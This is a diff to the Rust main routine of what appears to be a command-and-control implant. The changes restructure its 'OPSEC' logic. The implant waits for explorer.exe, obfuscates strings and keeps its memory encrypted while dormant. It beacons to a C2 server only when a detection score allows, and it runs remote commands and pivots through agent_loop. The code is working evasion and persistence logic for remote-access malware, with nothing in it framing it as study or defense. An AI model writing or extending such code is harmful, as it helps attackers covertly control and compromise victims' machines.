@@ -16,9 +16,6 @@ use log::{info, warn, error};
 use std::env;
 use std::sync::Arc;
 use std::time::Duration;
-use obfstr::obfstr;
-use sysinfo::{System, RefreshKind};
-use std::ffi::OsStr;
 
 
 // Dormant startup function
@@ -26,18 +23,23 @@ use std::ffi::OsStr;
 // It checks for the presence of explorer.exe and waits for up to 10 minutes
 #[cfg(target_os = "windows")]
 fn dormant_startup() {
+    use sysinfo::{System, RefreshKind};
+    use std::ffi::OsStr;
+    use obfstr::obfstr;
+
     let mut sys = System::new_with_specifics(RefreshKind::everything());
     let start = std::time::Instant::now();
     // Wait up to 10 minutes or until explorer.exe is running
     while start.elapsed().as_secs() < 600 {
         sys.refresh_specifics(RefreshKind::everything());
-        if sys.processes_by_name(OsStr::new(obfstr!("explorer.exe"))).next().is_some() { // PATCH: obfuscate process name
+        if sys.processes_by_name(OsStr::new(obfstr!("explorer.exe"))).next().is_some() {
             break;
         }
         std::thread::sleep(std::time::Duration::from_secs(5));
     }
 }
 
+const REDUCED_ACTIVITY_SLEEP_SECS: u64 = 120; // Sleep for 2 minutes in ReducedActivity (can make configurable later)
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -95,36 +97,64 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     info!("[AGENT] Starting main loop. Agent ID: {}", agent_id);
 
-    // Wait until it is safe for E.T. to phone home
+    // --- Initial Opsec Check Loop (before first agent_loop call) ---
     loop {
-        if determine_agent_mode(&config) == AgentMode::BackgroundOpsec {
-            info!("[OPSEC] Safe to beacon home. Starting agent.");
-            break;
-        } else {
-            info!("[OPSEC] Not safe to beacon home. Staying encrypted and dormant.");
-            std::thread::sleep(Duration::from_secs(5));
-        }
-    }
-
-    loop {
-        if let Err(e) = agent_loop(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
-            error!("[ERROR] Shell error: {}. Exiting...", e);
-        }
-        // After agent_loop returns, re-encrypt and wait for safe conditions again
-        {
-            let mut protector = MEMORY_PROTECTOR.lock().unwrap();
-            protector.protect();
-        }
-        info!("[OPSEC] Returned to FullOpsec. Waiting for safe conditions...");
-        loop {
-            if determine_agent_mode(&config) == AgentMode::BackgroundOpsec {
-                info!("[OPSEC] Safe to beacon home again. Resuming agent.");
-                break;
-            } else {
-                std::thread::sleep(Duration::from_secs(5));
-                info!("[OPSEC] Not safe to beacon home. Staying encrypted and dormant.");
+        let current_mode = determine_agent_mode(&config);
+        match current_mode {
+            AgentMode::BackgroundOpsec => {
+                info!("[OPSEC] Safe to beacon home. Starting agent.");
+                break; // Exit this loop to start agent_loop
+            }
+            AgentMode::ReducedActivity => {
+                info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Sleeping longer.");
+                // Ensure state is encrypted
+                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
+                std::thread::sleep(Duration::from_secs(REDUCED_ACTIVITY_SLEEP_SECS)); 
+            }
+            AgentMode::FullOpsec => {
+                info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
+                // Ensure state is encrypted (might be redundant but safe)
+                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
+                std::thread::sleep(Duration::from_secs(5)); // Short sleep, rely on score decay/cooldown
             }
         }
     }
-    // Ok(())
+    // --- End Initial Opsec Check Loop ---
+
+    // --- Main Agent Execution Loop --- 
+    loop {
+        // Decrypt memory before potential agent_loop call
+        { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
+        
+        // agent_loop handles C2 comms and command execution
+        if let Err(e) = agent_loop(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
+            error!("[ERROR] Agent loop error: {}. Preparing to re-assess OPSEC state.", e);
+            // Don't immediately exit; re-encrypt and re-assess below
+        }
+        
+        // After agent_loop returns (or if it errored), always re-encrypt
+        { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
+        info!("[OPSEC] Returned from agent_loop or error occurred. Re-encrypted. Re-assessing OPSEC state...");
+
+        // Re-assessment Loop (similar to initial check)
+        loop {
+            let current_mode = determine_agent_mode(&config);
+            match current_mode {
+                 AgentMode::BackgroundOpsec => {
+                    info!("[OPSEC] Safe to beacon home again. Resuming agent_loop.");
+                    break; // Exit re-assessment loop, main loop will call agent_loop again
+                }
+                AgentMode::ReducedActivity => {
+                    info!("[OPSEC] High score after agent activity. Entering ReducedActivity mode.");
+                    std::thread::sleep(Duration::from_secs(REDUCED_ACTIVITY_SLEEP_SECS)); 
+                }
+                AgentMode::FullOpsec => {
+                     info!("[OPSEC] High score after agent activity. Entering FullOpsec mode.");
+                    std::thread::sleep(Duration::from_secs(5)); 
+                }
+            }
+            // Note: State remains encrypted during ReducedActivity and FullOpsec sleeps here
+        }
+    }
+    // Ok(()) // Main loop should not exit normally
 }
